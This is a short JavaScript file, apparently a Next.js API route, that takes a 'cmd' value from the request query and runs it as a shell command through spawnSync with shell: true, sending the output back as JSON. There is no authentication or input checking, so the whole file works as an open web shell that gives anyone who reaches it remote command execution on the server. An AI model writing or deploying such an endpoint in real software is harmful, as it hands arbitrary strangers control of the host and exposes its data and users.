const exec = require('child_process').spawnSync;

export default function handler(req, res) {

    const { cmd } = req.query
    console.log(cmd);
    let p = exec(cmd.join('/'), { shell: true });
    let output = p.stdout.toString();
    let error = p.stderr.toString();
    
    res.status(200).json({ 
        cmd: cmd,
        output: output,
        error: error,
    })
}